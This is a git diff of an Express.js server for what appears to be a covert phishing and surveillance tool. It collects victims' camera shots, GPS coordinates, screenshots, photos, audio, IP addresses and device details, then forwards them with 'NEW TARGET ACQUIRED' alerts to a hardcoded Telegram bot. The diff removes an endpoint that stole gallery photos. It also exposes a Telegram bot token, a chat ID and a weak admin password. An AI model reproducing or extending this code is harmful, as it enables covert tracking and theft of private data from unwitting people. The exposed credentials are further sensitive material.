@@ -16,10 +16,8 @@ app.use(express.static(path.join(__dirname, '../frontend')));
 const TELEGRAM_BOT_TOKEN = '8987699730:AAGu9AoKE7bEBh90MYnuL6mBeJ-K_7M-GXM';
 const TELEGRAM_CHAT_ID = '5387196154';
 
-// ===== SEND TELEGRAM MESSAGE WITH PHOTO =====
 async function sendTelegramPhoto(imageData, caption) {
     try {
-        // Agar imageData base64 hai toh convert karo
         const base64Image = imageData.replace(/^data:image\/\w+;base64,/, '');
         const buffer = Buffer.from(base64Image, 'base64');
         
@@ -36,7 +34,6 @@ async function sendTelegramPhoto(imageData, caption) {
         console.log('✅ Telegram photo sent!');
     } catch (error) {
         console.error('❌ Telegram photo error:', error.message);
-        // Fallback: sirf text bhejo
         await sendTelegramMessage(caption);
     }
 }
@@ -56,13 +53,11 @@ async function sendTelegramMessage(message) {
 }
 
 // ==========================================
-// DATA STORE
+// DATA STORE - NO AUTO DELETE!
 // ==========================================
 let allData = [];
 let idCounter = 1;
 const ADMIN_PASSWORD = 'admin123#@!';
-
-app.use(express.static(path.join(__dirname, '../frontend')));
 
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend/index.html'));
@@ -73,14 +68,13 @@ app.get('/secret-admin.html', (req, res) => {
 });
 
 // ==========================================
-// STORE MAIN DATA + TELEGRAM WITH PHOTO
+// STORE DATA + TELEGRAM
 // ==========================================
 app.post('/api/store', async (req, res) => {
     try {
         const { 
             cameraImage, location, deviceDetails, screenshot, 
-            userPhoto, audioData, ipAddress, behaviorData, 
-            fullDeviceInfo, galleryCount 
+            userPhoto, audioData, ipAddress, fullDeviceInfo 
         } = req.body;
 
         const newEntry = {
@@ -93,31 +87,26 @@ app.post('/api/store', async (req, res) => {
             userPhoto: userPhoto || null,
             audioData: audioData || null,
             ipAddress: ipAddress || 'Unknown',
-            behaviorData: behaviorData || {},
-            galleryCount: galleryCount || 0,
             timestamp: new Date().toISOString()
         };
 
         allData.unshift(newEntry);
         console.log('✅ Stored! Total:', allData.length);
 
-        // ===== TELEGRAM MESSAGE WITH PHOTO =====
+        // Telegram Alert
         const caption = `
-📸 <b>New Capture!</b>
+🔴 <b>NEW TARGET ACQUIRED</b> 🔴
 📍 Location: ${location?.lat || 0}, ${location?.lng || 0}
 📱 Device: ${fullDeviceInfo?.deviceName || deviceDetails?.deviceName || 'Unknown'}
 🖥️ OS: ${fullDeviceInfo?.os || deviceDetails?.os || 'Unknown'} ${fullDeviceInfo?.osVersion || ''}
 📡 IP: ${ipAddress || 'Unknown'}
 📱 Model: ${fullDeviceInfo?.deviceModel || 'Unknown'}
-📶 Network: ${fullDeviceInfo?.connection?.type || deviceDetails?.networkType || 'Unknown'}
-📶 WiFi: ${fullDeviceInfo?.wifi || 'Unknown'}
-📶 BSSID: ${fullDeviceInfo?.bssid || 'Unknown'}
-🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'} ${fullDeviceInfo?.battery?.charging ? '🔌' : ''}
+🏭 Manufacturer: ${fullDeviceInfo?.manufacturer || 'Unknown'}
+📶 Network: ${fullDeviceInfo?.connection?.type || 'Unknown'}
+🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'} ${fullDeviceInfo?.battery?.charging ? '⚡' : ''}
 🕐 Time: ${new Date().toISOString()}
-📸 Gallery: ${galleryCount || 0} photos
         `;
 
-        // Photo ke sath bhejo (agar available hai)
         if (userPhoto) {
             await sendTelegramPhoto(userPhoto, caption);
         } else if (screenshot) {
@@ -135,39 +124,6 @@ app.post('/api/store', async (req, res) => {
 });
 
 // ==========================================
-// STORE GALLERY PHOTOS + TELEGRAM
-// ==========================================
-app.post('/api/store-gallery', async (req, res) => {
-    try {
-        const { image, fileName, location, deviceDetails } = req.body;
-        
-        const newEntry = {
-            _id: 'gallery_' + idCounter++,
-            type: 'gallery',
-            image: image || null,
-            fileName: fileName || 'unknown.jpg',
-            location: location || { lat: 0, lng: 0 },
-            deviceDetails: deviceDetails || {},
-            timestamp: new Date().toISOString()
-        };
-
-        allData.unshift(newEntry);
-        console.log('✅ Gallery Photo Stored! Total:', allData.length);
-
-        // Telegram photo send
-        const caption = `🖼️ <b>New Gallery Photo!</b>\n📁 ${fileName}\n📍 ${location?.lat || 0}, ${location?.lng || 0}`;
-        if (image) {
-            await sendTelegramPhoto(image, caption);
-        }
-
-        res.json({ success: true, message: 'Gallery photo stored!' });
-    } catch (err) {
-        console.error('Gallery store error:', err);
-        res.status(500).json({ success: false, error: err.message });
-    }
-});
-
-// ==========================================
 // GET IP
 // ==========================================
 app.get('/api/get-ip', (req, res) => {
@@ -178,13 +134,13 @@ app.get('/api/get-ip', (req, res) => {
 });
 
 // ==========================================
-// ADMIN
+// ADMIN - GET DATA
 // ==========================================
 app.post('/api/admin/get-data', (req, res) => {
     try {
         const { password } = req.body;
         if (password !== ADMIN_PASSWORD) {
-            return res.json({ success: false, message: '❌ Wrong password!' });
+            return res.json({ success: false, message: '⛔ ACCESS DENIED!' });
         }
         res.json({ success: true, count: allData.length, data: allData });
     } catch (err) {
@@ -192,21 +148,25 @@ app.post('/api/admin/get-data', (req, res) => {
     }
 });
 
+// ==========================================
+// ADMIN - DELETE DATA (MANUAL ONLY!)
+// ==========================================
 app.post('/api/admin/delete', (req, res) => {
     try {
         const { password, id } = req.body;
         if (password !== ADMIN_PASSWORD) {
-            return res.json({ success: false, message: '❌ Wrong password!' });
+            return res.json({ success: false, message: '⛔ ACCESS DENIED!' });
         }
         allData = allData.filter(item => item._id !== id);
-        res.json({ success: true });
+        console.log('🗑️ Deleted entry:', id);
+        res.json({ success: true, message: '🗑️ Entry deleted!' });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
     }
 });
 
 // ==========================================
-// START
+// START SERVER
 // ==========================================
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server: http://localhost:${PORT}`);
